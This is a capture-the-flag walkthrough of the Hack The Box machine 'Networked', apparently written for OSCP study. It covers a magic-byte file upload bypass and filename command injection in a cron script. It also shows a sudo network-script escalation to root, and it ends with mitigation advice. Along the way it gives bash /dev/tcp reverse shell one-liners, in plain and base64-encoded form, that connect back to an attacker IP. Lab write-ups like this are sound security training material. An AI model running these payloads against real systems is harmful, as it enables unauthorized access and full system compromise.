---
title: Networked
date: 2025-05-12
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, file-upload-bypass, mime-type, magic-bytes, command-injection, sudo-network-scripts-privesc, ifcf ] 
image: networked.png
media_subpath: /assets/img/posts/2025-05-12-networkedHTB/
---

## Introduction

In this walkthrough, I exploited **Networked**, an easy-difficulty Linux machine vulnerable to a **file upload bypass**, which enabled me to upload a reverse shell and gain **initial code execution**. After gaining access, I discovered a **user-level cron job** that lacked proper input sanitization. By placing a malicious command in the expected path, I was able to execute commands as that user.

Further enumeration revealed that the compromised user had **sudo privileges** to execute a **network configuration script**. I reviewed the script and found it insecurely handled input . I exploited this misconfiguration to execute arbitrary commands as **root**, achieving full system compromise.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

version - OpenSSH 7.4 (protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - OpenSSH 7.4 (protocol 2.0)

![image.png](image%201.png)

Let’s perform gobuster scan:

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 42  -x .php -b 403,404
```

![image.png](image%202.png)

I found `backup.tar` in backup directory and found these files inside of it.

Navigating to `http://10.10.10.146/photos.php` we can see uploaded photos.

![image.png](image%203.png)

In `upload.php` we can upload files

Let’s analyze `upload.php` file and find out if there are filters against `php` file upload. We see it loads `lib.php` likely functions that are used here are defined in `lib.php`.

![image.png](image%204.png)

```php
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
```

```php
function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}
```

```php
list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

```

There are 2 filters, one checks for MIME type reading magic bytes of the file and the other one checks for extension.

Let’s add those magic bytes that of `.jpg` files have

[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

![image.png](image%205.png)

As in ASCII format they have unprintable characters let’s add `hex` values using the following command:

```php
echo 'FF D8 FF E0' | xxd -p -r > mime_shell.php
cat shell.php >> mime_shell.php
mv mime_shell.php mime_shell.php.jpg
```

![image.png](image%206.png)

We see prepended magic bytes of `jpg` file.

Success! We were able to upload php file:

![image.png](image%207.png)

The question is will the file be executed by server as php file or will be interpreted as image file we can check it by navigating to `uploads/filename`.

It actually worked 

![image.png](image%208.png)

the problem is related to php shell itself.

Then I changed `shell.php` to the following one:
[PHP-Reverse-Shell](https://github.com/xdayeh/Php-Reverse-Shell/blob/master/PHP-Reverse-Shell.php)

Now we got the shell:

![image.png](image%209.png)

## Lateral Movement

We see user `guly` and their crontab and script that is executed, I noticed that `php` is defined without its full path but `PATH` variable is not set in crontab itself that means it will use default minimal PATH which us `/bin:/usr/bin`, and we don’t have access to that directories. In this case we are gonna inspect the file itself as it is a `php` file `exec, system` function can be used unsafely, which is a potential point for command injection.

Injection happens when a website or application takes input from a user and mistakenly treats it as part of a command or query, instead of just data. This can allow an attacker to change how the command works, often gaining access to data or functionality they shouldn't be able to. A web application written in `PHP` may use the `exec`, `system`, `shell_exec`, `passthru`, or `popen` functions to execute commands directly on the back-end server, each having a slightly different use case. This is not unique to `PHP` only, but can occur in any web development framework or language. For example, if a web application is developed in `NodeJS`, a developer may use `child_process.exec` or `child_process.spawn` for the same purpose . `eval()`  -  is JS function that executes input passed to it

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path)); #takes everything except for . and ..

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value); #returns name in the form of IP address and extension of the file
  $check = check_ip($name,$value); #checks if IP address is valid IP address

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>

```

```php
function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

#takes name in the form 10_10_14_27.php.jpg and works with it, returns extensions and name in the form of
#valid IP address, which is then checked by check_ip() function
```

```php
function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}
```

In the script itself we have `nohup` binary which is written without full path too, but again it will use default minimal path (`/usr/bin/nohup`). The script will use the `if` condition only in that case when file format is not in the form of `IP_ADDRESS.<ext>`, and then will use php function `exec` in unsafe way. Though when uploading file from browser browser used function in `upload.php` to convert the name of the file to origin IP address format (10_10_14_27.jpg), so we can trigger that if condition with any name which is not IP_ADDRESS.EXT, but we are gonna try to inject the code in the name of the file. 

Linux filesystem is permissive, which means a user can create a file with essentially any name, except for `/` and `NULL`. Security risk arises when filenames start with `-`,  which can be interpreted as command-line option( option for a command ). 

Best way here seems to be base64 encoding and the piping the output to base64 decod

```bash
bash -i >& /dev/tcp/10.10.14.27/4444 0>&1
```

Encode the command to Base64

[Reverse Shell Generator](https://www.revshells.com/)

 then decode and it and pipe it into bash afterwards.

```bash
touch ';echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNy80NDQ0IDA+JjE= | base64 -d | bash'
```


> `;` is used in Unix systems to separate two commands
{: .prompt-warning }

Now we got a shell as guly:

![image.png](image%2010.png)

## Privilege Escalation

Checking `sudo -l` we can see we can run the script as root and without password:

![image.png](image%2011.png)

```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

```bash
&YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNy80NDQ1IDA+JjE | base64 -d | bash
```

I think we can try command injection here again, but `|` is not allowed, so maybe spawning a shell may work,

I used `/bin/bash` and it spawned a root shell.

![image.png](image%2012.png)

## Mitigation

- Apply strict **file upload validation**, including MIME type checks, extension whitelisting, and content inspection.
- Sanitize all **user-controlled inputs** in scripts, especially those run via cron or with elevated privileges.
- Regularly audit **cron jobs** for security and ensure they don’t operate on user-writeable paths.
- Harden **sudo configurations** by avoiding the use of scripts that call other commands or files without proper validation.
- Implement **logging and alerting** around file uploads, sudo executions, and cron activity for early detection of abuse.
